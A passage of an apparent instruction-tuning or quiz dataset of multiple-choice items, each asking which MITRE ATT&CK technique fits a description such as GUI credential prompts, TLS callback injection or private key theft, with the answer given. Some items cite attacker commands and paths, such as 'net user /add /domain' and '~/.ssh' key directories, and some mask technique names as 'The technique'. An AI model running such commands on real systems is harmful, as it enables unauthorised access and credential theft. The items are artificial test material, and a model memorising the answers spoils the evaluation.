      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt can be used to collect credentials via various languages such as AppleScript and PowerShell. On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell).\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.\n\nA. Process Injection: ListPlanting, B. Exfiltration Over Web Service, C. Input Capture: GUI Input Capture, D. Remote Services: Windows Remote Management\nA:",
    "context": "",
    "output": "C. Input Capture: GUI Input Capture",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt can be used to collect credentials via various languages such as AppleScript and PowerShell. On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell).\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.",
      "options": "A. Process Injection: ListPlanting, B. Exfiltration Over Web Service, C. Input Capture: GUI Input Capture, D. Remote Services: Windows Remote Management",
      "choice": "C. Input Capture: GUI Input Capture",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nA. Software Deployment Tools, B. Email Collection: Local Email Collection, C. Phishing: Spearphishing Voice, D. Create Account: Domain Account\nA:",
    "context": "",
    "output": "D. Create Account: Domain Account",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
      "options": "A. Software Deployment Tools, B. Email Collection: Local Email Collection, C. Phishing: Spearphishing Voice, D. Create Account: Domain Account",
      "choice": "D. Create Account: Domain Account",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process\u2019 memory space using other Process Injection techniques such as Process Hollowing.\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.\nA. Establish Accounts: Email Accounts, B. Obfuscated Files or Information: Fileless Storage, C. Taint Shared Content, D. Process Injection: Thread Local Storage",
    "context": "",
    "output": "D. Process Injection: Thread Local Storage",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process\u2019 memory space using other Process Injection techniques such as Process Hollowing.\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. Establish Accounts: Email Accounts, B. Obfuscated Files or Information: Fileless Storage, C. Taint Shared Content, D. Process Injection: Thread Local Storage",
      "choice": "D. Process Injection: Thread Local Storage",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may perform The technique (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see Endpoint Denial of Service.\n\nA. Supply Chain Compromise: Compromise Software Supply Chain, B. Compromise Infrastructure: Network Devices, C. Endpoint Denial of Service: OS Exhaustion Flood, D. Network Denial of Service\nA:",
    "context": "",
    "output": "D. Network Denial of Service",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may perform The technique (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see Endpoint Denial of Service.",
      "options": "A. Supply Chain Compromise: Compromise Software Supply Chain, B. Compromise Infrastructure: Network Devices, C. Endpoint Denial of Service: OS Exhaustion Flood, D. Network Denial of Service",
      "choice": "D. Network Denial of Service",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nA. Unsecured Credentials: Credentials in Registry, B. Account Manipulation: Additional Email Delegate Permissions, C. Process Discovery, D. Data from Information Repositories: Sharepoint\nAnswer:",
    "context": "",
    "output": "D. Data from Information Repositories: Sharepoint",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources",
      "options": "A. Unsecured Credentials: Credentials in Registry, B. Account Manipulation: Additional Email Delegate Permissions, C. Process Discovery, D. Data from Information Repositories: Sharepoint",
      "choice": "D. Data from Information Repositories: Sharepoint",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse the technique (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows Dynamic Data Exchange or Component Object Model. Linux environments support several different IPC mechanisms, two of which being sockets and pipes. Higher level execution mediums, such as those of Command and Scripting Interpreters, may also leverage underlying IPC mechanisms. Adversaries may also use Remote Services such as Distributed Component Object Model to facilitate remote IPC execution.\n\nOptions:\nA. Inter-Process Communication, B. Search Open Technical Databases: CDNs, C. Domain Trust Discovery, D. Impair Defenses: Disable Windows Event Logging",
    "context": "",
    "output": "A. Inter-Process Communication",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse the technique (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows Dynamic Data Exchange or Component Object Model. Linux environments support several different IPC mechanisms, two of which being sockets and pipes. Higher level execution mediums, such as those of Command and Scripting Interpreters, may also leverage underlying IPC mechanisms. Adversaries may also use Remote Services such as Distributed Component Object Model to facilitate remote IPC execution.",
      "options": "A. Inter-Process Communication, B. Search Open Technical Databases: CDNs, C. Domain Trust Discovery, D. Impair Defenses: Disable Windows Event Logging",
      "choice": "A. Inter-Process Communication",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.\n\nOptions:\nA. User Execution: Malicious File, B. Impair Defenses, C. Boot or Logon Autostart Execution: Kernel Modules and Extensions, D. Drive-by Compromise",
    "context": "",
    "output": "A. User Execution: Malicious File",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "options": "A. User Execution: Malicious File, B. Impair Defenses, C. Boot or Logon Autostart Execution: Kernel Modules and Extensions, D. Drive-by Compromise",
      "choice": "A. User Execution: Malicious File",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts.  \n\nAdversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.\nA. Native API, B. Modify Authentication Process: Hybrid Identity, C. Indirect Command Execution, D. Obfuscated Files or Information: Compile After Delivery\nAnswer:",
    "context": "",
    "output": "C. Indirect Command Execution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts.  \n\nAdversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.",
      "options": "A. Native API, B. Modify Authentication Process: Hybrid Identity, C. Indirect Command Execution, D. Obfuscated Files or Information: Compile After Delivery",
      "choice": "C. Indirect Command Execution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).\n\nA. Modify Authentication Process: Pluggable Authentication Modules, B. Gather Victim Identity Information: Email Addresses, C. Rogue Domain Controller, D. Exploitation for Client Execution\nA:",
    "context": "",
    "output": "B. Gather Victim Identity Information: Email Addresses",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).",
      "options": "A. Modify Authentication Process: Pluggable Authentication Modules, B. Gather Victim Identity Information: Email Addresses, C. Rogue Domain Controller, D. Exploitation for Client Execution",
      "choice": "B. Gather Victim Identity Information: Email Addresses",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.\n\nA. Brute Force: Credential Stuffing, B. Exfiltration Over Web Service: Exfiltration to Text Storage Sites, C. Create Account: Local Account, D. Unsecured Credentials: Private Keys\nAnswer:",
    "context": "",
    "output": "D. Unsecured Credentials: Private Keys",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.",
      "options": "A. Brute Force: Credential Stuffing, B. Exfiltration Over Web Service: Exfiltration to Text Storage Sites, C. Create Account: Local Account, D. Unsecured Credentials: Private Keys",
      "choice": "D. Unsecured Credentials: Private Keys",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).\nA. Establish Accounts: Social Media Accounts, B. Acquire Infrastructure: Serverless, C. Active Scanning: Scanning IP Blocks, D. Credentials from Password Stores: Password Managers\nAnswer:",
    "context": "",
    "output": "A. Establish Accounts: Social Media Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).",
      "options": "A. Establish Accounts: Social Media Accounts, B. Acquire Infrastructure: Serverless, C. Active Scanning: Scanning IP Blocks, D. Credentials from Password Stores: Password Managers",
      "choice": "A. Establish Accounts: Social Media Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.\n\nPossible answers:\nA. Adversary-in-the-Middle, B. Steal or Forge Kerberos Tickets: AS-REP Roasting, C. Permission Groups Discovery: Local Groups, D. Deobfuscate/Decode Files or Information",
    "context": "",
    "output": "C. Permission Groups Discovery: Local Groups",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
      "options": "A. Adversary-in-the-Middle, B. Steal or Forge Kerberos Tickets: AS-REP Roasting, C. Permission Groups Discovery: Local Groups, D. Deobfuscate/Decode Files or Information",
      "choice": "C. Permission Groups Discovery: Local Groups",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. \n\nSimilar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.\n\nA. Event Triggered Execution: AppCert DLLs, B. BITS Jobs, C. Obfuscated Files or Information: Compile After Delivery, D. Gather Victim Identity Information\nA:",
    "context": "",
    "output": "A. Event Triggered Execution: AppCert DLLs",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. \n\nSimilar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",
      "options": "A. Event Triggered Execution: AppCert DLLs, B. BITS Jobs, C. Obfuscated Files or Information: Compile After Delivery, D. Gather Victim Identity Information",
      "choice": "A. Event Triggered Execution: AppCert DLLs",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. \n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.\nA. System Binary Proxy Execution: Regsvr32, B. System Owner/User Discovery, C. Server Software Component: IIS Components, D. Taint Shared Content\nAnswer:",
    "context": "",
    "output": "D. Taint Shared Content",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. \n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
      "options": "A. System Binary Proxy Execution: Regsvr32, B. System Owner/User Discovery, C. Server Software Component: IIS Components, D. Taint Shared Content",
      "choice": "D. Taint Shared Content",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. \n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a Trusted Relationship to execute commands in connected virtual machines.\nA. Unsecured Credentials: Cloud Instance Metadata API, B. System Shutdown/Reboot, C. Cloud Infrastructure Discovery, D. Cloud Administration Command",
    "context": "",
    "output": "D. Cloud Administration Command",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. \n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a Trusted Relationship to execute commands in connected virtual machines.",
      "options": "A. Unsecured Credentials: Cloud Instance Metadata API, B. System Shutdown/Reboot, C. Cloud Infrastructure Discovery, D. Cloud Administration Command",
      "choice": "D. Cloud Administration Command",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
